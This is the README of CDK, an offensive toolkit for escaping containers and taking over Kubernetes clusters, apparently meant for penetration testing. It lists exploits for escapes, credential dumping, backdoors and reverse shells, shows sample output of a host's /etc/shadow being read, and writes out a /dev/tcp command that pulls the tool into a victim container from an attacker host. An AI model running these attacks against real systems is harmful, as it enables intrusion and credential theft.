## CDK <https://github.com/cdk-team/CDK>
<!--auto_detail_badge_begin_0b490ffb61b26b45de3ea5d7dd8a582e-->
![Language](https://img.shields.io/badge/Language-Golang-blue)
![Author](https://img.shields.io/badge/Author-cdkteam-orange)
![GitHub stars](https://img.shields.io/github/stars/cdk-team/CDK.svg?style=flat&logo=github)
![Version](https://img.shields.io/badge/Version-V1.5.5-red)
![Time](https://img.shields.io/badge/Join-20210223-green)
<!--auto_detail_badge_end_fef74f2d7ea73fcc43ff78e05b1e7451-->

# CDK - Zero Dependency Container Penetration Toolkit

English | [简体中文](https://github.com/cdk-team/CDK/wiki/CDK-Home-CN)

![png](https://user-images.githubusercontent.com/7868679/177925206-8d83dc95-0f2f-4d61-9a45-0d43b1b0468f.png)

## Legal Disclaimer

Usage of CDK for attacking targets without prior mutual consent is illegal.
CDK is for security testing purposes only.

## Overview

CDK is an open-sourced container penetration toolkit, designed for offering stable exploitation in different slimmed containers without any OS dependency. It comes with useful net-tools and many powerful PoCs/EXPs and helps you to escape container and take over K8s cluster easily.

## Quick Start

Run **`cdk eva`** to get evaluate info and a recommend exploit, then run **`cdk run`** to start the attack.

```
> ./cdk eva --full

[*] Maybe you can exploit the *Capabilities* below:
[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation.
[!] CAP_SYS_MODULE enabled. You can escape the container via loading kernel module. More info at https://xcellerator.github.io/posts/docker_escape/.
Critical - SYS_ADMIN Capability Found. Try 'cdk run rewrite-cgroup-devices/mount-cgroup/...'.
Critical - Possible Privileged Container Found.

> ./cdk run cap-dac-read-search

Running with target: /etc/shadow, ref: /etc/hostname
ubuntu:$6$*******:19173:0:99999:7:::
root:*:18659:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
```

## Installation/Delivery

Download latest release in https://github.com/cdk-team/CDK/releases/

Drop executable files into the target container and start testing.

### TIPS: Deliver CDK into target container in real-world penetration testing

If you have an exploit that can upload a file, then you can upload CDK binary directly.

If you have a RCE exploit, but the target container has no `curl` or `wget`, you can use the following method to deliver CDK:

1. First, host CDK binary on your host with public IP.
```
(on your host)
nc -lvp 999 < cdk
```

2. Inside the victim container execute
```
cat < /dev/tcp/(your_public_host_ip)/(port) > cdk
chmod a+x cdk
```

## Usage
```
Usage:
  cdk evaluate [--full]
  cdk run (--list | <exploit> [<args>...])
  cdk <tool> [<args>...]

Evaluate:
  cdk evaluate                              Gather information to find weakness inside container.
  cdk evaluate --full                       Enable file scan during information gathering.

Exploit:
  cdk run --list                            List all available exploits.
  cdk run <exploit> [<args>...]             Run single exploit, docs in https://github.com/cdk-team/CDK/wiki

Auto Escape:
  cdk auto-escape <cmd>                     Escape container in different ways then let target execute <cmd>.

Tool:
  vi <file>                                 Edit files in container like "vi" command.
  ps                                        Show process information like "ps -ef" command.
  nc [options]                              Create TCP tunnel.
  ifconfig                                  Show network information.
  kcurl <path> (get|post) <uri> <data>      Make request to K8s api-server.
  ectl <endpoint> get <key>                 Unauthorized enumeration of ectd keys.
  ucurl (get|post) <socket> <uri> <data>    Make request to docker unix socket.
  probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000

Options:
  -h --help     Show this help msg.
  -v --version  Show version.
```

## Features

CDK has three modules:

1. Evaluate: gather information inside container to find potential weakness.
2. Exploit: for container escaping, persistance and lateral movement
3. Tool: network-tools and APIs for TCP/HTTP requests, tunnels and K8s cluster management.

### Evaluate Module

Usage
```
cdk evaluate [--full]
```
This command will run the scripts below without local file scanning, using `--full` to enable all.

|Tactics|Script|Supported|Usage/Example|
|---|---|---|---|
|Information Gathering|OS Basic Info|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-System-Info)|
|Information Gathering|Available Capabilities|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Commands-and-Capabilities)|
|Information Gathering|Available Linux Commands|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Commands-and-Capabilities)|
|Information Gathering|Mounts|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Mounts)|
|Information Gathering|Net Namespace|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Net-Namespace)|
|Information Gathering|Sensitive ENV|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Services)|
|Information Gathering|Sensitive Process|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Services)|
|Information Gathering|Sensitive Local Files|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Sensitive-Files)|
|Information Gathering|Kube-proxy Route Localnet(CVE-2020-8558)|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-check-net.ipv4.conf.all.route_localnet)|
|Information Gathering|DNS-Based Service Discovery|✔|[link](https://github.com/kubernetes/dns/blob/master/docs/specification.md)|
|Discovery|K8s Api-server Info|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-API-Server)|
|Discovery|K8s Service-account Info|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-Service-Account)|
|Discovery|Cloud Provider Metadata API|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Cloud-Provider-Metadata-API)|

### Exploit Module

List all available exploits:
```
cdk run --list
```

Run targeted exploit:
```
cdk run <script-name> [options]
```

| Tactic               | Technique                                                  | CDK Exploit Name       | Supported | In Thin                                                                    | Doc                                                                                  |
|----------------------|------------------------------------------------------------|------------------------|-----------|----------------------------------------------------------------------------|--------------------------------------------------------------------------------------|
| Escaping             | docker-runc CVE-2019-5736                                  | runc-pwn               | ✔         | ✔                                                                          ||
| Escaping             | containerd-shim CVE-2020-15257                             | shim-pwn               | ✔         || [link](https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn)             |
| Escaping             | docker.sock PoC (DIND attack)                              | docker-sock-check      | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-check)              |
| Escaping             | docker.sock RCE                                            | docker-sock-pwn        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-pwn)                |
| Escaping             | Docker API(2375) RCE                                       | docker-api-pwn         | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-api-pwn)                 |
| Escaping             | Device Mount Escaping                                      | mount-disk             | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-mount-disk)                     |
| Escaping             | LXCFS Escaping                                             | lxcfs-rw               | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-lxcfs-rw)                       |
| Escaping             | Cgroups Escaping                                           | mount-cgroup           | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-mount-cgroup)                   |
| Escaping             | Abuse Unprivileged User Namespace Escaping  CVE-2022-0492  | abuse-unpriv-userns    | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-abuse-unpriv-userns)            |
| Escaping             | Procfs Escaping                                            | mount-procfs           | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-mount-procfs)                   |
| Escaping             | Ptrace Escaping PoC                                        | check-ptrace           | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-check-ptrace)                   |
| Escaping             | Rewrite Cgroup(devices.allow)                              | rewrite-cgroup-devices | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices)         |
| Escaping             | Read arbitrary file from host system (CAP_DAC_READ_SEARCH) | cap-dac-read-search    | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-cap-dac-read-search)            |
| Discovery            | K8s Component Probe                                        | service-probe          | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-service-probe)                  |
| Discovery            | Dump Istio Sidecar Meta                                    | istio-check            | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-check-istio)                    |
| Discovery            | Dump K8s Pod Security Policies                             | k8s-psp-dump           | ✔         || [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-psp-dump)         |
| Remote Control       | Reverse Shell                                              | reverse-shell          | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-reverse-shell)                  |
| Remote Control       | Kubelet Exec                                               | kubelet-exec           | ✔         | ✔                                                                          |                  |
| Credential Access    | Registry BruteForce                                        | registry-brute         | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-Container-Image-Registry-Brute) |
| Credential Access    | Access Key Scanning                                        | ak-leakage             | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-ak-leakage)                     |
| Credential Access    | Etcd Get K8s Token                                         | etcd-get-k8s-token     | ✔         | ✔                                                                          |                |
| Credential Access    | Dump K8s Secrets                                           | k8s-secret-dump        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-secret-dump)                |
| Credential Access    | Dump K8s Config                                            | k8s-configmap-dump     | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-configmap-dump)             |
| Privilege Escalation | K8s RBAC Bypass                                            | k8s-get-sa-token       | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-get-sa-token)               |
| Persistence          | Deploy WebShell                                            | webshell-deploy        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-webshell-deploy)                |
| Persistence          | Deploy Backdoor Pod                                        | k8s-backdoor-daemonset | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset)         |
| Persistence          | Deploy Shadow K8s api-server                               | k8s-shadow-apiserver   | ✔         || [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver) |
| Persistence          | K8s MITM Attack (CVE-2020-8554)                            | k8s-mitm-clusterip     | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Evaluate:-k8s-mitm-clusterip)            |
| Persistence          | Deploy K8s CronJob                                         | k8s-cronjob            | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-cronjob)                    |

**Note about Thin:** The **thin release** is prepared for short life container shells such as serverless functions. We add build tags in source code and cut a few exploits to get the binary lighter. The 2MB file contains 90% of CDK functions, also you can pick up useful exploits in CDK source code to build your own lightweight binary.

### Tool Module

Running commands like in Linux, little different in input-args, see the usage link.
```
cdk nc [options]
cdk ps
```

|Command|Description|Supported|Usage/Example|
|---|---|---|---|
|nc|TCP Tunnel|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-nc)|
|ps|Process Information|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-ps)|
|ifconfig|Network Information|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-ifconfig)|
|vi|Edit Files|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-vi)|
|ectl|Unauthorized enumeration of ectd keys|✔||
|kcurl|Request to K8s api-server|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-kcurl)|
|dcurl|Request to Docker HTTP API|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-dcurl)|
|ucurl|Request to Docker Unix Socket|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-ucurl)|
|rcurl|Request to Docker Registry API|||
|probe|IP/Port Scanning|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-probe)|

<!--auto_detail_active_begin_e1c6fb434b6f0baf6912c7a1934f772b-->
## 项目相关

- 2022-11-11 发布演示视频[404星链计划开源安全工具演示——CDK](https://www.bilibili.com/video/BV1DG4y1Z784/)
- 2021-11-11 发布文章[《CDK:一款针对容器场景的多功能渗透工具》](https://mp.weixin.qq.com/s/fopvHFPAbbqtCE6SV9JerQ)

## 最近更新

#### [v1.5.5] - 2025-02-23

**更新**  
- 修复新的调试日志，未来需要修复该错误  
- 修复 gh action 中路径中未找到 gox 的问题  
- 修复 gh action 由于使用了弃用版本而自动失败的问题  
- 修复 shim-pwn 合并目录在路径中出现两次的问题

#### [v1.5.4] - 2024-11-15

**更新**  
- 修复合并目录在路径中出现两次的问题  
- 修复添加测试 poc，Github Action 中出现未知错误的问题  
- 优化漏洞列表的输出  
- 在所有漏洞中添加类型字符串  
- 修复 github action 检查因未知问题而失败的问题  
- 添加漏洞的基本结构  
- 重新组织漏洞包中的 exp 文件  
- 在 cmd 行中运行二进制本机 kubectl 的保留路径  
- 修复在路径中找不到 gox 的问题  
- 修复使用了弃用版本而自动失败的问题

#### [v1.5.3] - 2024-05-19

**更新**  
- 为 docker rootfs 适配 docker devicemapper 文件系统  
- 增加查看网络连接信息  
- 修复 k8s apiserver 中超时问题  
- 添加netstat文档  
- 修复 cgroup 后半部分切片长度错误

#### [v1.5.2] - 2023-03-12

**更新**  
- 支持 linux 环境下的不同容器运行时，如 containerd、runc、docker  
- 修复shadow-apiserver匿名访问无效的issue，支持新版本的k8s，如 v1.23.1  
- 添加迭代部分功能的消息提醒

#### [v1.5.0] - 2022-09-25

**更新**  
- 检查内核漏洞利用，使用 mzet-/linux-exploit-suggester  
- 支持检查路径中的 setuid 文件  
- 为功能列表添加增加红色高亮输出  
- 支持两种新的格式化打印函数  
- 优化 CDK banner 高亮输出

<!--auto_detail_active_end_f9cf7911015e9913b7e691a7a5878527-->
